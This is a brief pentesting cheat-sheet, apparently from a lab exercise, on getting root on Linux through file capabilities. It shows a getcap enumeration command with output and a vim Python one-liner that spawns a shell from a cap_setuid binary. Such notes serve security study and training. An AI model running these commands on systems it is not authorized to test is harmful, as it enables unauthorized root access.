# Exploit capable programs

Become root on Linux via capabilities:

1. Check for capable programs
2. Leverage program

## Example: vim

To check for capable programs, use the `getcap` tool:
```text
karen@target:~$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/home/karen/vim = cap_setuid+ep
/home/ubuntu/view = cap_setuid+ep
```

[Leverage vim](https://gtfobins.github.io/gtfobins/vim/) and execute a shell using python:

```text
vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

## Notes

Another method system administrators can use to increase the privilege level of a process or binary is by capabilities. 
Capabilities help manage privileges at a more granular level. If a SOC analyst needs to use a tool that needs to initiate socket connections, the capabilities of the binary can be changed such that it would get through its task without needing a higher privilege user.
